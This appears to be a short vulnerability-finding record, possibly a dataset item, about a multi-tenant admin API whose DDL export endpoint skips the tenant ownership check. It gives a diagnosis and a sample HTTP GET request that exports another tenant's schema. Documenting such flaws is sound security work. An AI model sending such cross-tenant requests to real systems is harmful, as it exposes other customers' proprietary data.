diagnosis: The DDL export endpoint generates and returns complete SQL schema definitions (including custom table structures, triggers, and stored procedures) for tenant_{tenant_id}. Because it lacks validation that tenant_id == current_user.tenant_id, any authenticated user can export the proprietary database schema of any other tenant.
exploit_request:
GET /admin/tenants/corp_fintech_secure/export-ddl HTTP/1.1
Host: admin.saasdb.net
Authorization: Bearer <unauthorized_jwt>
